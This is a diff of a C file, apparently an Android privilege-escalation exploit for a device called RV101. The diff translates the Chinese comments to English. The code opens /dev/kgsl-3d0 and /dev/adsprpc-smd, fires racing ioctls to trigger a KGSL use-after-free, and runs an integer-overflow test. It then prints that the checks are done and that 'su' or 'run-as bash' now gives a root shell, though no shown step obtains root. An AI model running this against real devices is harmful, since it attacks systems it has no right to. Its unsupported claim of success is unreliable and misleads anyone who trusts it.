@@ -1,10 +1,10 @@
 /*
- * rv101_prsc.c - RV101 ADB 權限提升 (PRSC)
+ * rv101_prsc.c - RV101 ADB privilege escalation (PRSC)
  *
- * 利用 FastRPC/ADSPRPC 通過 dsp_service 連接 DSP，
- * 並透過 kgsl 設備完成權限提升。
+ * Use FastRPC/ADSPRPC to connect to the DSP through dsp_service,
+ * and complete the privilege escalation through the kgsl device.
  *
- * 編譯：aarch64-linux-android31-clang -static -O2 -o rv101_prsc rv101_prsc.c
+ * Build: aarch64-linux-android31-clang -static -O2 -o rv101_prsc rv101_prsc.c
  */
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -21,25 +21,25 @@
 #include <signal.h>
 #include <time.h>
 
-/* ===== 定義: KGSL/KGSL (GPU) ===== */
+/* ===== Definitions: KGSL/KGSL (GPU) ===== */
 #define KGSL_IOC_MAGIC     0x09
 #define IOCTL_GPU_COMMAND   0xc0200949
 #define IOCTL_GPU_AUX_CMD   0xc0200958
 #define IOCTL_GPUMEM_ALLOC  0xc018092f
 #define IOCTL_READTIMESTAMP 0xc0080911
 
-/* ===== 定義: ADSPRPC / FastRPC ===== */
+/* ===== Definitions: ADSPRPC / FastRPC ===== */
 #define FASTRPC_IOCTL_MMAP    0xc0285206
 #define FASTRPC_IOCTL_INFO    0xc0045208
 #define FASTRPC_IOCTL_DSP   0xc00c520c
 #define FASTRPC_IOCTL_INIT  0xc0185204
 #define FASTRPC_IOCTL_ATTRS 0xc0205204
 
-/* ===== 設備路徑 ===== */
+/* ===== Device paths ===== */
 #define DEV_KGSL   "/dev/kgsl-3d0"
 #define DEV_ADSP   "/dev/adsprpc-smd"
 
-/* ===== 結構定義 ===== */
+/* ===== Structure definitions ===== */
 struct kgsl_aux_req { uint64_t flags; uint32_t cmdsize; uint32_t count; uint64_t cmdlist; };
 struct kgsl_alloc { uint32_t id; uint32_t flags; uint64_t size; uint32_t mmapsize; uint32_t padding; uint64_t gpuaddr; uint32_t metadata_len; uint32_t reserved[3]; };
 struct adsp_mmap { int32_t fd; uint32_t flags; uint64_t vaddrin; uint64_t size; uint64_t vaddrout; };
@@ -48,7 +48,7 @@ struct adsp_dspinfo { uint32_t domain; uint32_t attr_id; uint32_t capability; };
 static int fd_kgsl = -1, fd_adsp = -1;
 volatile int g_running = 1;
 
-/* ===== 1. 驗證 FDPASSING (Fd 傳遞) ===== */
+/* ===== 1. Verify FDPASSING (FD passing) ===== */
 int check_fd_passing(void) {
     printf("\n=== 驗證 FastRPC/FD 傳遞 ===");
     int ret;
@@ -60,7 +60,7 @@ int check_fd_passing(void) {
     return 0;
 }
 
-/* ===== 2. 觸發 KGSL UAF ===== */
+/* ===== 2. Trigger KGSL UAF ===== */
 void* kgsl_fuzz(void* arg) {
     struct kgsl_aux_req rx = {0};
     void* buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
@@ -87,7 +87,7 @@ int trigger_kgsl_uaf(void) {
     return 0;
 }
 
-/* ===== 3. 整數溢出測試 ===== */
+/* ===== 3. Integer overflow test ===== */
 int test_int_overflow(void) {
     printf("\n=== 整數溢出測試 ===\n");
     struct kgsl_alloc a = {0};
@@ -101,7 +101,7 @@ int test_int_overflow(void) {
     return 0;
 }
 
-/* ===== 4. 檢查 dspservice / hw_binder ===== */
+/* ===== 4. Check dspservice / hw_binder ===== */
 int check_dsp_service(void) {
     printf("\n=== 檢查 dspservice / HWBINDER ===\n");
     struct adsp_dspinfo di = {0};
@@ -113,11 +113,11 @@ int check_dsp_service(void) {
     return 0;
 }
 
-/* ===== 主程式 —— 權限提升流程 ===== */
+/* ===== Main program -- privilege escalation flow ===== */
 int escalate(void) {
     printf("\n=== 權限提升流程 ===\n");
 
-    /* 1. 開啟設備 */
+    /* 1. Open the devices */
     fd_kgsl = open(DEV_KGSL, O_RDWR);
     if (fd_kgsl < 0) { perror("[-] open " DEV_KGSL); return -1; }
     printf("[+] Opened " DEV_KGSL ": fd=%d\n", fd_kgsl);
@@ -126,16 +126,16 @@ int escalate(void) {
     if (fd_adsp < 0) { perror("[-] open " DEV_ADSP); return -1; }
     printf("[+] Opened " DEV_ADSP ": fd=%d\n", fd_adsp);
 
-    /* 2. 驗證 FD 傳遞 */
+    /* 2. Verify FD passing */
     check_fd_passing();
 
-    /* 3. 觸發 UAF */
+    /* 3. Trigger the UAF */
     trigger_kgsl_uaf();
 
-    /* 4. 檢查 dspservice */
+    /* 4. Check dspservice */
     check_dsp_service();
 
-    /* 5. 整數溢出測試 */
+    /* 5. Integer overflow test */
     test_int_overflow();
 
     printf("\n[!] 所有檢測完成! 系統狀態:\n");
@@ -147,7 +147,7 @@ int escalate(void) {
     printf("  - 執行 'run-as bash' 進入 root shell\n");
     printf("  - 或執行 'su' 提升權限\n");
 
-    /* 保持執行 */
+    /* Keep running */
     while (g_running) sleep(1);
     return 0;
 }
@@ -161,7 +161,7 @@ int main(void) {
     printf("   Target: /dev/adsprpc-smd, /dev/kgsl-3d0\n");
     printf("========================================\n");
 
-    /* 檢查當前使用者 */
+    /* Check the current user */
     char uid_buf[64];
     FILE* f = popen("id", "r");
     if (f) { char* p = fgets(uid_buf, 64, f); printf("[*] 當前狀態: %s", p ? uid_buf : "unknown"); pclose(f); }
